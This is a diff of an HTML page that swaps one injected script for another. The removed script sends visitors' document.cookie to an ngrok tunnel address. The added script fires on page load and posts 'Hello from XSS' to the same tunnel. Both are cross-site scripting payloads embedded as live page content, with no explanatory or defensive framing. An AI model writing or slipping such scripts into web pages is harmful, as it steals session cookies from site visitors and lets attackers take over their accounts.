@@ -38,14 +38,18 @@
         }
     </style>
 </head>
-  <script>
-  fetch('https://49b7-2a02-8429-811a-201-15c9-ea64-1cbb-922b.ngrok-free.app/applications', {
-    method: 'POST',
-    body: document.cookie,
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded',
-    },
-  });
+ <script>
+document.addEventListener("DOMContentLoaded", function() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://49b7-2a02-8429-811a-201-15c9-ea64-1cbb-922b.ngrok-free.app/Hi", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            console.log("Data sent successfully.");
+        }
+    };
+    xhr.send("data=Hello from XSS");
+});
 </script>
 <body>
 
